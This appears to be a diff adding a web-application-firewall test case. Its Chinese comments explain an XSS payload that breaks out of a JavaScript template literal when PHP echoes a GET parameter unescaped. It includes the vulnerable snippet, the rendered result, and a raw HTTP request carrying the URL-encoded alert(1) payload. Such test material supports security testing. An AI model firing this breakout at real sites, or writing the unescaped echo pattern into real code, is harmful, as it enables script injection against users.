@@ -1,0 +1,13 @@
+#这个 Payload 是专门针对后端将输入变量嵌入到 JavaScript 反引号（模板字符串）内部的场景而设计的。
+#<script>
+#    let userContent = `<?php echo $_GET['code']; ?>`;
+#    console.log(userContent);
+#</script>
+#<script>
+#     let userContent = `<div>`-alert(1)</script><script>`</div>`;
+#     console.log(userContent);
+# </script>
+GET newxss/xss4.php?code=%3Cdiv%3E`-alert(1)%3C/script%3E%3Cscript%3E`%3C/div%3E HTTP/1.1
+Host: www.swaf.com
+User-Agent: test-client
+Accept: */*
